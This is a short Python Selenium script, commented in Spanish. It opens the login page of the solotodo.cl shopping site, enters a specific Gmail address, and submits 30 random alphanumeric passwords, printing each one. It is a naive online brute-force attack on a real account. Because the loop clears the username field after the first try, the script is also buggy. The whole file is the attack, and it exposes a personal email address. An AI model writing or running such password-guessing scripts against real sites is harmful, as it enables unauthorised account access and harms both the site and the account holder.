
import string
import time
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome(executable_path=r"C:\driver_chrome_selenium\chromedriver.exe")
driver.get('https://www.solotodo.cl/account/login?next=%2F')


#el xpath es copiado de la misma pagina con las herramientas de desarrollador
base = string.ascii_letters + string.digits #a-zA-Z0-9
user = driver.find_element_by_xpath('//*[@id="exampleInputEmail1"]')
u = "nicolasestebanc9@gmail.com"
user.send_keys(u)

for x in range(30):
    
    psw = driver.find_element_by_xpath('//*[@id="password"]')
    p = ''.join(random.choice(base) for i in range(random.randrange(6,20)))
    print(p)
    psw.send_keys(p)
    driver.find_element_by_xpath('//*[@id="main-container"]/div/div/div[3]/div/form/input').submit()    
    time.sleep(1)
    psw.clear()
    user.clear()




